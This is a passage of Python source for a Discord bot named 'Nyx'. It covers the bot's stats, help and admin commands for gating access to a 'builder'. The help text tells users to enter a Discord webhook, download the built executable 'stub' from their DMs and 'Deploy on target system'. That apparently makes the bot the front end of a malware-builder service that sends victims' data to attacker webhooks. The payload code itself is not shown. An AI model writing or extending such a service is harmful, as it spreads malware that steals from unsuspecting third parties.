                color=0x95A5A6
            )

            await interaction.response.edit_message(embed=embed, view=None)

    embed = discord.Embed(
        title="⚠️ Clear All Build Logs",
        description="Are you sure you want to clear all build logs? This action cannot be undone.",
        color=0xE74C3C
    )

    view = ClearLogsConfirm()
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="stats", description="View statistics about the build system")
async def stats(interaction: discord.Interaction):
    allowed = load_allowed()
    blacklisted = load_blacklisted()
    logs = load_build_logs()

    total_builds = len(logs)

    unique_users = set()
    for log in logs:
        unique_users.add(log.get('user_id'))

    today = datetime.now().date()
    daily_builds = {(today - timedelta(days=i)).strftime('%Y-%m-%d'): 0 for i in range(7)}

    for log in logs:
        try:
            build_date = datetime.fromisoformat(log.get('timestamp', '')).date().strftime('%Y-%m-%d')
            if build_date in daily_builds:
                daily_builds[build_date] += 1
        except:
            pass

    daily_stats = '\n'.join([f"• **{date}**: {count} builds" for date, count in daily_builds.items()])

    embed = discord.Embed(
        title="📊 Nyx  Statistics",
        description="Overview of the build system's activity and usage",
        color=0x9B59B6
    )

    embed.add_field(
        name="🧮 System Metrics",
        value=(
            f"• **Total Builds:** {total_builds}\n"
            f"• **Unique Users:** {len(unique_users)}\n"
            f"• **Authorized Users:** {len(allowed)}\n"
            f"• **Blacklisted Users:** {len(blacklisted)}"
        ),
        inline=True
    )

    embed.add_field(
        name="📅 Recent Activity (7 Days)",
        value=daily_stats or "No recent builds",
        inline=True
    )

    if interaction.guild:
        embed.add_field(
            name="🌐 Server Info",
            value=(
                f"• **Server:** {interaction.guild.name}\n"
                f"• **Members:** {interaction.guild.member_count}\n"
                f"• **Build Access Rate:** {(len(allowed) / interaction.guild.member_count * 100):.1f}%"
            ),
            inline=False
        )

    embed.set_footer(text=f"Stats generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    if await is_admin(interaction):
        embed.add_field(
            name="⚙️ Admin Commands",
            value=(
                "• `/build-access list` - View all authorized users\n"
                "• `/build-logs` - View recent build logs\n"
                "• `/blacklist @user` - Block a user from building\n"
                "• `/build-access add @user` - Grant build access"
            ),
            inline=False
        )

    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="help", description="Get help with using the Nyx ")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔧 Nyx  - Help",
        description="Welcome to the Nyx ! Here's how to use the available commands:",
        color=0x3498DB
    )

    embed.add_field(
        name="📋 Basic Commands",
        value=(
            "• `/build` - Build your custom Discord stub with your webhook\n"
            "• `/stats` - View statistics about the system\n"
            "• `/help` - Display this help message"
        ),
        inline=False
    )

    if await is_admin(interaction):
        embed.add_field(
            name="🛠️ Administrator Commands",
            value=(
                "• `/build-access add @user` - Give a user access to the builder\n"
                "• `/build-access remove @user` - Remove a user's build access\n"
                "• `/build-access list` - List all authorized users\n"
                "• `/blacklist @user [reason]` - Block a user from using the builder\n"
                "• `/unblacklist @user` - Remove a user from the blacklist\n"
                "• `/build-logs [limit] [@user]` - View recent build logs\n"
                "• `/clear-logs` - Erase all build logs"
            ),
            inline=False
        )

    embed.add_field(
        name="📝 How To Build a Stub",
        value=(
            "1. Use the `/build` command\n"
            "2. Enter your Discord webhook URL and desired filename\n"
            "3. Wait for the build process to complete\n"
            "4. Download the executable from your DMs\n"
            "5. Deploy on target system"
        ),
        inline=False
    )

    if not await is_admin(interaction) and str(interaction.user.id) not in load_allowed():
        embed.add_field(
            name="⚠️ Access Required",
            value="You don't currently have permission to use the `/build` command. Please contact an administrator to request access.",
            inline=False
        )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")

    if interaction.guild and interaction.guild.icon:
        footer_icon = interaction.guild.icon.url
    else:
        footer_icon = None

    embed.set_footer(text=f"Nyx | v1.0 • {timestamp}", icon_url=footer_icon)

    await interaction.response.send_message(embed=embed, ephemeral=True)

bot.run(token)